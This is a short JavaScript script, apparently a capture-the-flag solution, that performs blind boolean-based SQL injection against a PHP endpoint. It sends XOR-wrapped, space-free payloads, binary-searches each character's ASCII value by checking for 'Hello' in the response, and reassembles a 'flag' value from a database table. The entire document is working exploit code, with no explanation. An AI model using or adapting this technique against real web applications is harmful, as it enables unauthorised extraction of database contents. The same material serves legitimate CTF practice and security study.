async function extract(pos) {
    let lo = 32, hi = 127;
    while (lo < hi) {
        let mid = Math.floor((lo + hi) / 2);
        let body = 'id=1^(ascii(substr((select(flag)from(flag)),' + pos + ',1))>' + mid + ')^1';
        let resp = await fetch('/index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: body
        });
        let text = await resp.text();
        if (text.includes('Hello')) lo = mid + 1;
        else hi = mid;
    }
    return String.fromCharCode(lo);
}

async function solve() {
    let flag = '';
    for (let i = 1; i <= 50; i++) {
        let c = await extract(i);
        if (c.charCodeAt(0) < 33 || c.charCodeAt(0) > 126) break;
        flag += c;
        console.log('Pos ' + i + ': ' + c + ' | ' + flag);
    }
    console.log('%cFLAG: ' + flag, 'font-size:20px;color:green');
}

solve();
